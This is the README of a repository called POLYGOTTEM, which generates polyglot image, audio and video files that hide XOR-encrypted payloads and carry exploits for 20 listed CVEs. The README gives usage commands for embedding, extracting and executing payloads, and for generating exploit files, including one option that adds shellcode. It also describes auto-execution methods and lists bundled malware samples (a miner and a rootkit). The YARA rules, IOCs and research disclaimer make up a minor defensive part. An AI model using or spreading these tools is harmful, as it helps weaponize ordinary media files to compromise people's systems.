# POLYGOTTEM
Originally inspired by a trove of polyglot files from TeamTNT and KEYPLUG and getting my shit kicked in on a regular basis by auto executing malware i took all the crap people tossed at me and made a genuinely world record breaking polyglot generator that nobody but me will ever fucking use or know about even though its dope,oh well.

## Overview

This repository contains analysis and proof-of-concept implementations of polyglot image steganography techniques used by APT TeamTNT cryptomining campaigns (2020-2024) and APT-41's KEYPLUG plus a SIGNIFICANT amount of my own researdhch. 
THe main focus is auto executing polyglots in a wide variety of formats and "how many valid file types can i create" and apparently the answer is 8 beating the previous world record by 3.

## Repository Structure

```
POLYGOTTEM/
├── vx_underground/          # Main C implementation for publication
│   ├── polyglot_embed.c     # Pure C payload embedder (9.3KB)
│   ├── polyglot_extract.c   # Pure C payload extractor (11KB)
│   ├── albanian_virus.sh    # Harmless demo payload (meme)
│   ├── Makefile             # Build system with tests
│   └── README.md            # VX Underground submission docs
│
├── tools/                   # Python PoC toolkit
│   ├── polyglot_embed.py    # Python payload embedder
│   ├── polyglot_extract.py  # Python payload extractor
│   ├── desktop_generator.py # .desktop auto-execution generator
│   ├── exploit_header_generator.py # CVE exploit headers (5 CVEs)
│   └── demo_full_attack.sh  # Interactive demonstration
│
├── docs/                    # Research documentation
│   ├── ANALYSIS_FINDINGS.md # Complete malware analysis with IOCs
│   ├── AUTO_EXECUTION_ANALYSIS.md # Auto-execution mechanisms
│   └── PUBLICATION_READY.md # Publication checklist
│
└── samples/                 # Malware samples (research only)
    ├── binaries/           # Binary analysis samples
    │   ├── aarch64         # XMRig Monero miner (4.2MB)
    │   ├── cryptd          # UPX-packed rootkit (122KB)
    │   └── cryptd_extracted/ # Unpacked rootkit analysis
    └── polyglot_images/    # Hundreds of polyglot meme images
        ├── Payloads2/      # 100+ brainlet memes with embedded payloads
        ├── Payloads3/      # 100+ additional samples
        ├── Payloads4/      # 100+ additional samples
        ├── Payloads5/      # Final batch of samples
        └── payloads_extra/ # Additional extracted samples
```

## Quick Start

### Build VX Underground Package

```bash
cd vx_underground
make              # Build both tools
make demo         # Run Albanian virus demonstration
make test         # Run automated tests
make clean        # Clean build artifacts
```

### Using the Tools

**Embed a payload in an image:**
```bash
./polyglot_embed input.gif payload.sh output.gif 9e0a61200d
```

**Extract a payload from an image:**
```bash
./polyglot_extract infected.gif output.bin 9e0a61200d
chmod +x output.bin
./output.bin
```

## Technical Details

### Polyglot Structure

- **Valid Images:** GIF, JPEG, PNG, WebP, TIFF, BMP files remain fully viewable
- **Audio Formats:** MP3, FLAC, OGG Vorbis, WAV with embedded exploits
- **Video Formats:** MP4, H.264/H.265, WMF with malicious payloads
- **Hidden Payloads:** XOR-encrypted data appended after EOF markers
- **Encryption:** Multi-byte XOR (TeamTNT keys: 9e, d3, a5, 9e0a61200d, 410d200d)
- **Portability:** Pure C and Python implementations

### CVE Exploits Implemented (20 Total)

**PRIORITY 1 - Critical/Recent (3 CVEs):**
- CVE-2023-4863 (libwebp) - Heap overflow in Huffman decoder (CRITICAL - ACTIVELY EXPLOITED!)
- CVE-2024-10573 (mpg123) - Frankenstein stream heap overflow
- CVE-2023-52356 (libtiff) - Heap overflow in TIFFReadRGBATileExt

**PRIORITY 2 - High-Value Legacy (6 CVEs):**
- CVE-2017-8373 (libmad) - MP3 Layer III heap overflow
- CVE-2006-0006 (Windows Media Player) - BMP heap overflow
- CVE-2020-22219 (FLAC) - Encoder buffer overflow
- CVE-2020-0499 (FLAC) - Decoder heap OOB read
- CVE-2008-1083 (Windows GDI) - EMF/WMF heap overflow
- CVE-2005-4560 (WMF) - SETABORTPROC code execution

**PRIORITY 3 - Audio/Video (6 CVEs):**
- CVE-2017-6827 (audiofile) - WAV MSADPCM heap overflow
- CVE-2018-5146 (libvorbis) - OGG Vorbis OOB write
- CVE-2022-22675 (AppleAVD) - iOS/macOS video accelerator overflow
- CVE-2021-0561 (FLAC) - Encoder OOB write
- CVE-2017-11126 (mpg123) - Layer III global buffer overflow
- CVE-2021-40426 (libsox) - SPHERE file heap overflow

**EXISTING (5 CVEs):**
- CVE-2015-8540 (libpng) - Buffer overflow in chunk name
- CVE-2019-7317 (libpng) - Use-after-free
- CVE-2018-14498 (libjpeg) - Heap buffer over-read
- CVE-2019-15133 (giflib) - Division by zero
- CVE-2016-3977 (giflib) - Heap buffer overflow

### Auto-Execution Methods

1. **.desktop File Association** - XDG Desktop Entry exploitation
2. **Image Viewer CVE Exploits** - 20 CVEs implemented across multiple libraries
3. **Social Engineering Scripts** - User-initiated extraction
4. **Archive Auto-Extractors** - Self-extracting archives

See `docs/AUTO_EXECUTION_ANALYSIS.md` and `CVE_RESEARCH_BUFFER_OVERFLOW.md` for complete details.

### New Tools

**exploit_header_generator.py** - Generate individual CVE exploits
```bash
# Generate WebP exploit (CRITICAL!)
python3 tools/exploit_header_generator.py CVE-2023-4863 exploit.webp

# Generate MP3 exploit
python3 tools/exploit_header_generator.py CVE-2024-10573 exploit.mp3

# Generate with shellcode (DANGEROUS!)
python3 tools/exploit_header_generator.py CVE-2023-52356 exploit.tiff -p exec_sh
```

**multi_cve_polyglot.py** - Combine multiple CVE exploits into polyglots
```bash
# Generate image polyglot (6 formats)
python3 tools/multi_cve_polyglot.py image polyglot_image.gif

# Generate audio polyglot (4 formats)
python3 tools/multi_cve_polyglot.py audio polyglot_audio.mp3

# Generate MEGA polyglot (12+ formats, ALL CVEs!)
python3 tools/multi_cve_polyglot.py mega polyglot_mega.dat

# Custom polyglot with specific CVEs
python3 tools/multi_cve_polyglot.py custom custom.bin --cves CVE-2023-4863 CVE-2024-10573
```

**Test Suite** - Automated testing of all CVE implementations
```bash
# Run all tests
./tests/test_all_cves.sh

# Run tests and clean up
./tests/test_all_cves.sh --clean
```

**YARA Detection Rules** - Detect generated exploits
```bash
# Scan directory for exploits
yara -r detection/cve_exploits.yar /path/to/scan/

# Scan with verbose output
yara -s -r detection/cve_exploits.yar /path/to/scan/
```

## Attribution

**APT TeamTNT** - Cloud-focused cryptomining group (2020-2024)
- Targets: AWS, Azure, GCP, Alibaba Cloud
- Techniques: Container escapes, credential theft, polyglot steganography
- Related: APT-41 KEYPLUG malware (similar techniques)

## Research Purpose

This repository is for **security research and education only**. The techniques documented here are based on real-world APT campaigns and are provided to:

- Help defenders understand polyglot steganography attacks
- Enable detection and analysis of similar campaigns
- Advance security research in image-based payload delivery
- Document APT TeamTNT tactics for threat intelligence

The demo payload (Albanian virus meme) is harmless and serves only as a technical demonstration.

## Detection

**YARA Rules:** See `docs/ANALYSIS_FINDINGS.md`
**Suricata Signatures:** Network traffic detection included
**File Analysis:** Use entropy scanning on images (>7.5 entropy after EOF)

## IOCs

- **cryptd MD5:** `fbf6bb336f808d1adf037599a08ba8e0`
- **XMRig Pool:** `randomx.xmrig.com:443`
- **Common XOR Keys:** `9e`, `d3`, `a5`, `9e0a61200d`, `410d200d`

See `docs/ANALYSIS_FINDINGS.md` for complete IOC list.

## Publications

VX Underground submission prepared in `vx_underground/` directory with complete documentation suitable for publication.

## License

Research and educational purposes only. Not for malicious use.

## References

- APT TeamTNT campaigns (2020-2024)
- APT-41 KEYPLUG malware analysis
- TeamTNT cryptomining infrastructure
- VX Underground malware database

---

**POLYGOTTEM** - Polyglot 'em! Understanding polyglot steganography in APT campaigns.
